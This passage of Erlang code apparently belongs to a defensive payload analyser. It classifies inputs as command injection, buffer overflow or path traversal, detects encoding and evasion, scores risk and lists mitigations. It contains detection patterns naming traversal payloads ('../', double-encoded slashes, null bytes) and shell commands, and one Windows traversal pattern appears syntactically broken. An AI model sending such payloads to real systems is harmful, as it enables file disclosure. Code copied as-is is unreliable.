    ],
    
    DetectedPatterns = [Pattern || {Regex, Pattern} <- CommandPatterns,
                                  re:run(Payload, Regex, [caseless]) =/= nomatch],
    
    #{
        type => command_injection,
        patterns => DetectedPatterns,
        complexity => determine_complexity(DetectedPatterns),
        target_os => detect_target_os(Payload)
    }.

analyze_buffer_overflow_pattern(Payload) ->
    Size = byte_size(Payload),
    Patterns = analyze_overflow_patterns(Payload),
    
    #{
        type => buffer_overflow,
        payload_size => Size,
        overflow_patterns => Patterns,
        complexity => if Size > 100000 -> high; Size > 10000 -> medium; true -> low end
    }.

analyze_path_traversal_pattern(Payload) ->
    TraversalPatterns = [
        {<<"\\.\\./">>, unix_traversal},
        {<<"\\.\\.\\\">>, windows_traversal},
        {<<"\\.\\.%2f">>, url_encoded_traversal},
        {<<"\\.\\.%252f">>, double_encoded_traversal},
        {<<"file:">>, file_protocol},
        {<<"%00">>, null_byte_termination}
    ],
    
    DetectedPatterns = [Pattern || {Regex, Pattern} <- TraversalPatterns,
                                  re:run(Payload, Regex, [caseless]) =/= nomatch],
    
    #{
        type => path_traversal,
        patterns => DetectedPatterns,
        complexity => determine_complexity(DetectedPatterns),
        encoding_used => detect_encoding_techniques(Payload)
    }.

determine_complexity(Patterns) when length(Patterns) > 3 -> high;
determine_complexity(Patterns) when length(Patterns) > 1 -> medium;
determine_complexity(_) -> low.

detect_evasion_techniques(Payload) ->
    EvasionPatterns = [
        {<<"%[0-9a-fA-F]{2}">>, url_encoding},
        {<<"\\u[0-9a-fA-F]{4}">>, unicode_encoding},
        {<<"\\\\">>, backslash_escaping},
        {<<"/\\*.*\\*/">>, comment_evasion}
    ],
    
    [Technique || {Regex, Technique} <- EvasionPatterns,
                  re:run(Payload, Regex) =/= nomatch].

detect_target_os(Payload) ->
    case re:run(Payload, <<"(cmd\\.exe|dir|type)">>, [caseless]) of
        nomatch ->
            case re:run(Payload, <<"(bash|sh|ls|cat)">>, [caseless]) of
                nomatch -> unknown;
                _ -> unix_like
            end;
        _ -> windows
    end.

analyze_overflow_patterns(Payload) ->
    % Analyze patterns in buffer overflow payload
    case binary:match(Payload, binary:copy(<<"A">>, 100)) of
        nomatch -> 
            case binary:match(Payload, <<0:8000000>>) of % 1MB of zeros
                nomatch -> [custom_pattern];
                _ -> [null_padding]
            end;
        _ -> [repeated_characters]
    end.

detect_encoding_techniques(Payload) ->
    EncodingPatterns = [
        {<<"%[0-9a-fA-F]{2}">>, url_encoding},
        {<<"\\\\u[0-9a-fA-F]{4}">>, unicode_encoding},
        {<<"\\\\x[0-9a-fA-F]{2}">>, hex_encoding}
    ],
    
    [Technique || {Regex, Technique} <- EncodingPatterns,
                  re:run(Payload, Regex) =/= nomatch].

analyze_payload_structure(Payload) ->
    #{
        size => byte_size(Payload),
        encoding => detect_payload_encoding(Payload),
        structure => analyze_payload_grammar(Payload),
        entropy => calculate_entropy(Payload)
    }.

analyze_response_structure(Response) ->
    #{
        size => byte_size(Response),
        content_type => detect_content_type(Response),
        security_indicators => extract_security_indicators(Response),
        error_level => classify_error_level(Response)
    }.

detect_payload_encoding(Payload) ->
    case unicode:characters_to_binary(Payload, utf8) of
        {error, _, _} -> binary;
        {incomplete, _, _} -> binary;
        _ ->
            case re:run(Payload, <<"%[0-9a-fA-F]{2}">>) of
                nomatch -> utf8;
                _ -> url_encoded
            end
    end.

analyze_payload_grammar(Payload) ->
    case re:run(Payload, <<"^\\{.*\\}$">>) of
        nomatch ->
            case re:run(Payload, <<"^<.*>$">>) of
                nomatch -> unstructured;
                _ -> xml_like
            end;
        _ -> json_like
    end.

calculate_entropy(Data) ->
    % Calculate Shannon entropy
    Freqs = count_bytes(Data, #{}),
    Length = byte_size(Data),
    
    maps:fold(fun(_, Count, Acc) ->
        Probability = Count / Length,
        Acc - Probability * math:log2(Probability)
    end, 0.0, Freqs).

count_bytes(<<>>, Acc) -> Acc;
count_bytes(<<Byte:8, Rest/binary>>, Acc) ->
    count_bytes(Rest, maps:update_with(Byte, fun(X) -> X + 1 end, 1, Acc)).

detect_content_type(Response) ->
    case re:run(Response, <<"<html">>, [caseless]) of
        nomatch ->
            case re:run(Response, <<"^\\{.*\\}$">>) of
                nomatch -> text;
                _ -> json
            end;
        _ -> html
    end.

classify_error_level(Response) ->
    case re:run(Response, <<"Fatal|Critical">>, [caseless]) of
        nomatch ->
            case re:run(Response, <<"Error|Exception">>, [caseless]) of
                nomatch ->
                    case re:run(Response, <<"Warning|Notice">>, [caseless]) of
                        nomatch -> info;
                        _ -> warning
                    end;
                _ -> error
            end;
        _ -> fatal
    end.

assess_exploit_risk(#vulnerability{severity = Severity, indicators = Indicators, exploit_confirmed = Confirmed}) ->
    BaseRisk = case Severity of
        critical -> 0.9;
        high -> 0.7;
        medium -> 0.5;
        low -> 0.3
    end,
    
    IndicatorMultiplier = 1.0 + (length(Indicators) * 0.1),
    ConfirmationMultiplier = if Confirmed -> 1.5; true -> 1.0 end,
    
    min(1.0, BaseRisk * IndicatorMultiplier * ConfirmationMultiplier).

generate_specific_mitigations(#vulnerability{type = Type, indicators = Indicators}) ->
    BaseMitigations = case Type of
        sql_injection -> [
            <<"Use parameterized queries or prepared statements">>,
            <<"Implement input validation and sanitization">>,
            <<"Apply principle of least privilege to database accounts">>,
            <<"Enable database query logging and monitoring">>
        ];
        command_injection -> [
            <<"Avoid system calls with user input">>,
            <<"Use whitelist input validation">>,
            <<"Implement proper shell escaping">>,
            <<"Run processes with minimal privileges">>
        ];
        buffer_overflow -> [
            <<"Implement proper bounds checking">>,
            <<"Use safe string handling functions">>,
            <<"Enable stack protection mechanisms">>,
            <<"Implement address space layout randomization (ASLR)">>
        ];
        path_traversal -> [
            <<"Validate and normalize file paths">>,
            <<"Use whitelist of allowed directories">>,
            <<"Implement proper access controls">>,
            <<"Avoid direct file system access with user input">>
        ];
        _ -> [
            <<"Implement comprehensive input validation">>,
            <<"Apply security best practices">>,
            <<"Enable security monitoring and logging">>
        ]
    end,
    
    IndicatorSpecificMitigations = generate_indicator_mitigations(Indicators),
    BaseMitigations ++ IndicatorSpecificMitigations.

generate_indicator_mitigations(Indicators) ->
    lists:flatten([
        case Indicator of
            stack_trace_disclosure ->
                [<<"Disable detailed error messages in production">>,
                 <<"Implement proper error handling">>];
            authentication_bypass ->
                [<<"Review authentication mechanisms">>,
                 <<"Implement multi-factor authentication">>];
            file_disclosure ->
                [<<"Review file access permissions">>,
                 <<"Implement file access logging">>];
            _ -> []
        end || Indicator <- Indicators
    ]).